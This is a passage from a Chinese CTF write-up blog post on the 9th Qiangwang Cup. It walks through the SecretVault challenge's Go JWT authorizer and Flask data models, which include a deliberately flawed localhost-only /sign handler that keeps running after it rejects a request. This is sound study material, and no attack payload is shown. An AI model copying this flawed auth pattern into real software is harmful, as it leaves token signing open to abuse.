<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="单单两道题可以让我牢一整天 SecretVault附件的目录树  一个python的flask应用，不过有一个go的鉴权服务器，先看authorizer鉴权的流程 12345678910111213141516171819package mainimport (	&quot;crypto&#x2F;rand&quot;	&#x2F;&#x2F;提供安全的随机数生成器	&quot;encoding&#x2F;hex&quot;	&#x2F;&#x2F;提供十">
<meta property="og:type" content="article">
<meta property="og:title" content="第九届强网杯wp">
<meta property="og:url" content="https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="单单两道题可以让我牢一整天 SecretVault附件的目录树  一个python的flask应用，不过有一个go的鉴权服务器，先看authorizer鉴权的流程 12345678910111213141516171819package mainimport (	&quot;crypto&#x2F;rand&quot;	&#x2F;&#x2F;提供安全的随机数生成器	&quot;encoding&#x2F;hex&quot;	&#x2F;&#x2F;提供十">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018092838655.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022134428183.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/72f5af522a0d8ffd6cab40e9bdd0fead.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018202940645.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018215742496.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018220002490.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018222541176.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018225052723.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022141716443.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022140608965.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022154604315.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251019145055174.png">
<meta property="article:published_time" content="2025-10-18T01:25:14.000Z">
<meta property="article:modified_time" content="2025-10-22T07:46:11.929Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="第九届强网杯CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018092838655.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>第九届强网杯wp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/11/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025wp-web/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/10/16/0xgame2025Week3%E9%A2%98%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&text=第九届强网杯wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&is_video=false&description=第九届强网杯wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=第九届强网杯wp&body=Check out this article: https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&name=第九届强网杯wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&t=第九届强网杯wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SecretVault"><span class="toc-number">1.</span> <span class="toc-text">SecretVault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bbjv"><span class="toc-number">2.</span> <span class="toc-text">bbjv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp%EF%BC%88%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">ezphp（赛后复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yamcs"><span class="toc-number">4.</span> <span class="toc-text">yamcs</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        第九届强网杯wp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-10-18T01:25:14.000Z" class="dt-published" itemprop="datePublished">2025-10-18</time>
        
        (Updated: <time datetime="2025-10-22T07:46:11.929Z" class="dt-updated" itemprop="dateModified">2025-10-22</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFCTF/" rel="tag">第九届强网杯CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>单单两道题可以让我牢一整天</p>
<h2 id="SecretVault"><a href="#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h2><p>附件的目录树</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018092838655.png" alt="image-20251018092838655"></p>
<p>一个python的flask应用，不过有一个go的鉴权服务器，先看authorizer鉴权的流程</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span>	<span class="comment">//提供安全的随机数生成器</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span>	<span class="comment">//提供十六进制编码和解码功能</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span>		<span class="comment">//提供构建 HTTP 服务器和客户端的核心功能</span></span><br><span class="line">	<span class="string">&quot;net/http/httputil&quot;</span>	<span class="comment">//提供 HTTP 请求/响应的调试工具</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span>		<span class="comment">//提供常用字符串操作</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span>			<span class="comment">//处理时间与日期</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/golang-jwt/jwt/v5&quot;</span>		<span class="comment">//JWT（JSON Web Token）认证中常用的 Go 实现，用来签发、验证和解析 token。</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/mux&quot;</span>			<span class="comment">//一个流行的 Go Web 路由库</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	SecretKey = hex.EncodeToString(RandomBytes(<span class="number">32</span>))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>声明一个全局变量，生成<strong>随机的32字节密钥SecretKey</strong>，用于JWT签名</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> AuthClaims <span class="keyword">struct</span> &#123;</span><br><span class="line">	jwt.RegisteredClaims</span><br><span class="line">	UID <span class="type">string</span> <span class="string">`json:&quot;uid&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义JWT中包含的数据结构并添加了一个自定义的字段UID</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandomBytes</span><span class="params">(length <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, length)</span><br><span class="line">	<span class="keyword">if</span> _, err := rand.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>crypto/rand</code> 生成加密安全的随机字节</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignToken</span><span class="params">(uid <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims&#123;</span><br><span class="line">		UID: uid,</span><br><span class="line">		RegisteredClaims: jwt.RegisteredClaims&#123;</span><br><span class="line">			Issuer:    <span class="string">&quot;Authorizer&quot;</span>,</span><br><span class="line">			Subject:   uid,</span><br><span class="line">			ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),</span><br><span class="line">			IssuedAt:  jwt.NewNumericDate(time.Now()),</span><br><span class="line">			NotBefore: jwt.NewNumericDate(time.Now()),</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;)</span><br><span class="line">	tokenString, err := t.SignedString([]<span class="type">byte</span>(SecretKey))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tokenString, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建JWT token，其中包括UID以及RegisteredClaims的字段，并使用HMAC-SHA256算法结合SecretKey密钥进行签名</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUIDFromRequest</span><span class="params">(r *http.Request)</span></span> <span class="type">string</span> &#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>从请求中获取UID的过程</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">authHeader := r.Header.Get(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> authHeader == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		cookie, err := r.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			authHeader = <span class="string">&quot;Bearer &quot;</span> + cookie.Value</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>先是从Authorization中获取，若没有则从Cookie中的token去获取，如果 Cookie 存在，则 <code>err == nil</code>，进入构造Bearer格式</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authHeader) &lt;= <span class="number">7</span> || !strings.HasPrefix(authHeader, <span class="string">&quot;Bearer &quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	tokenString := strings.TrimSpace(authHeader[<span class="number">7</span>:])</span><br><span class="line">	<span class="keyword">if</span> tokenString == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后检查Bearer格式，说白了就是检查token是否是有效格式，并提取出token的内容设置为tokenString</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">token, err := jwt.ParseWithClaims(tokenString, &amp;AuthClaims&#123;&#125;, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unexpected signing method: %v&quot;</span>, token.Header[<span class="string">&quot;alg&quot;</span>])</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> []<span class="type">byte</span>(SecretKey), <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;failed to parse token: %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	claims, ok := token.Claims.(*AuthClaims)</span><br><span class="line">	<span class="keyword">if</span> !ok || !token.Valid &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;invalid token claims&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> claims.UID</span><br></pre></td></tr></table></figure>

<p><code>jwt.ParseWithClaims</code> 用于解析tokenString并验证签名，会把payload解码成AuthClaims结构体，但是<code>jwt.ParseWithClaims</code> 需要提供一个函数来返回签名密钥，这里的函数通过检测是否是HMAC加密并返回用于验证的密钥</p>
<p>最后会提取claims中的UID并返回</p>
<p>然后我们看看主函数main</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;	</span><br><span class="line">    authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">		req.URL.Scheme = <span class="string">&quot;http&quot;</span></span><br><span class="line">		req.URL.Host = <span class="string">&quot;127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line">		uid := GetUIDFromRequest(req)</span><br><span class="line">		log.Printf(<span class="string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-User&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-Forwarded-For&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, <span class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, uid)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>创建反向代理，转发到Flask应用，检测UID是否存在并设置请求头<code>X-User</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">signRouter := mux.NewRouter()	<span class="comment">//创建一个路由器实例</span></span><br><span class="line">signRouter.HandleFunc(<span class="string">&quot;/sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;	<span class="comment">//定义一个/sign路由</span></span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(r.RemoteAddr, <span class="string">&quot;127.0.0.1:&quot;</span>) &#123;	<span class="comment">// 检查客户端 IP 是否为本地</span></span><br><span class="line">		http.Error(w, <span class="string">&quot;Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">	&#125;</span><br><span class="line">	uid := r.URL.Query().Get(<span class="string">&quot;uid&quot;</span>)	<span class="comment">//从查询参数获取用户ID</span></span><br><span class="line">	token, err := SignToken(uid)	<span class="comment">//生成token</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;Failed to sign token: %v&quot;</span>, err)</span><br><span class="line">		http.Error(w, <span class="string">&quot;Failed to generate token&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.Write([]<span class="type">byte</span>(token))	<span class="comment">//返回token</span></span><br><span class="line">&#125;).Methods(<span class="string">&quot;GET&quot;</span>)	<span class="comment">//请求方法为get</span></span><br></pre></td></tr></table></figure>

<p>这个路由要求只能从本地去访问</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">log.Println(<span class="string">&quot;Sign service is running at 127.0.0.1:4444&quot;</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := http.ListenAndServe(<span class="string">&quot;127.0.0.1:4444&quot;</span>, signRouter); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">&quot;Authorizer middleware service is running at :5555&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := http.ListenAndServe(<span class="string">&quot;:5555&quot;</span>, authorizer); err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义了一个内部签名服务4444端口和外部反向代理服务5555端口</p>
<p>然后我们看一下app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">db = SQLAlchemy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)	<span class="comment">#主键，自增整数</span></span><br><span class="line">    username = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>, nullable=<span class="literal">False</span>)	<span class="comment">#用户名，最长 80 字符，unique=True 保证唯一，nullable=False 不允许为空</span></span><br><span class="line">    password_hash = db.Column(db.String(<span class="number">128</span>), nullable=<span class="literal">False</span>)	<span class="comment">#存储经哈希处理后的密码，长度限制为128</span></span><br><span class="line">    salt = db.Column(db.String(<span class="number">64</span>), nullable=<span class="literal">False</span>)		<span class="comment">#存储用于哈希的 salt</span></span><br><span class="line">    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=<span class="literal">False</span>)	<span class="comment">#创建时间，默认当前 UTC 时间</span></span><br><span class="line">    vault_entries = db.relationship(<span class="string">&#x27;VaultEntry&#x27;</span>, backref=<span class="string">&#x27;user&#x27;</span>, lazy=<span class="literal">True</span>, cascade=<span class="string">&#x27;all, delete-orphan&#x27;</span>)</span><br><span class="line">	<span class="comment">#创建ORM 关系：一个用户对应多个 VaultEntry，backref=&#x27;user&#x27;：在 VaultEntry 实例上可通过 .user 访问父 User</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VaultEntry</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)<span class="comment">#外键，指向 user 表的 id 字段；不可空</span></span><br><span class="line">    label = db.Column(db.String(<span class="number">120</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    login = db.Column(db.String(<span class="number">120</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    password_encrypted = db.Column(db.Text, nullable=<span class="literal">False</span>)	<span class="comment">#存储加密后的密码</span></span><br><span class="line">    notes = db.Column(db.Text)</span><br><span class="line">    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

